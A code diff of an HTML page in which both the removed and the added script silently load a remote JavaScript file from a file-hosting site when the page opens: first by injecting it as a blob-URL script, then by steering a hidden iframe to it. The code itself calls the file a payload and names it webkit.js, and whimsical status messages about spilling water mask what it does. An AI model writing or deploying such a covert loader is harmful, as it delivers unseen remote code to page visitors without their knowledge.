@@ -6,32 +6,25 @@
   <link rel="stylesheet" href="style250.css" />
   <script>
   setTimeout(() => {
-    fetch('https://files.catbox.moe/cwedrd.js') // Your untouched webkit.js
-      .then(res => res.text())
-      .then(js => {
-        const blob = new Blob([js], { type: 'application/javascript' });
-        const url = URL.createObjectURL(blob);
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
 
-        const script = document.createElement('script');
-        script.src = url;
-        script.defer = true;
+    // Loads a generic HTML page
+    iframe.src = 'https://files.catbox.moe/7cwlbl.html';
 
-        script.onload = () => {
-          document.getElementById("status").textContent = "Spilling 250ml... (unless frozen)";
-        };
+    iframe.onload = () => {
+      // Redirects to the payload
+      iframe.contentWindow.location.href = 'https://files.catbox.moe/cwedrd.js';
+      document.getElementById("status").textContent = "Payload rerouted via iframe hatch.";
+    };
 
-        script.onerror = () => {
-          document.getElementById("status").textContent = "Water not spilled.";
-        };
+    iframe.onerror = () => {
+      document.getElementById("status").textContent = "Iframe navigation failed!";
+    };
 
-        document.head.appendChild(script);
-      })
-      .catch(err => {
-        document.getElementById("status").textContent = "Bottle not filled: " + err.message;
-      });
+    document.body.appendChild(iframe);
   }, 1500);
 </script>
-
 </head>
 <body>
   <div class="container">
